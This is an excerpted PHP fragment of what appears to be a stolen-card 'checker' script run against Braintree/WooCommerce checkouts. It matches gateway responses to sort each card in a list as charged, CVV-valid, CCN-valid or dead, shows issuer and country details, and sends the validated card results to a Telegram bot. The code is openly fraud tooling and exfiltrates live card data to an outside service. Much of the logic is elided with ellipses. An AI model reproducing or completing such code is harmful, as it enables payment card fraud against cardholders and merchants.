...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    $telegramMessage = "[#CHARGED] - $lista [B3_CC APPROVED CVV]
    \n[$price1]
    \n[$hostname1]\n";
...
$log_entry .= "*Email* : `" . $escaped_email . "`\n";
   ...
   // Prepare Telegram message for CVV (Captcha Detected)
   $telegramMessage = "[#CVV] - $lista [BRAINTREE_CC CVV Gateway Rejected: avs_and_cvv]
   \n[$receiptUrl]
   \n[$price1]
   \n[$hostname1]\n";
   sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    <span style="color: #ff8009ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CVV] - $lista [BRAINTREE_CC CVV Address Validation]
    \n[$price1]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    <span style="color: #ff8009ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     // Prepare Telegram message for CVV (Captcha Detected)
   $telegramMessage = "[#CCN] - $lista [BRAINTREE_CC CCN Insufficient Funds]
   \n[$price1]
   \n[$hostname1]\n";
   sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     // Prepare Telegram message for CVV (Captcha Detected)
   $telegramMessage = "[#CVV] - $lista [BRAINTREE_CC CCN The card verification number does not match.]
   \n[$price1]
   \n[$hostname1]\n";
   sendToTelegram($telegramMessage, $telegramToken, $chatId);
    ...
    // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CVV] - $lista [BRAINTREE_CC CCN Insufficient funds in account]
    \n[$price1]
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
...
} elseif (strpos($Respo, 'There was an error processing your payment. Reason: Your payment method was rejected due to 3D Secure.') !== false) {
        echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [3D KUPAL][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
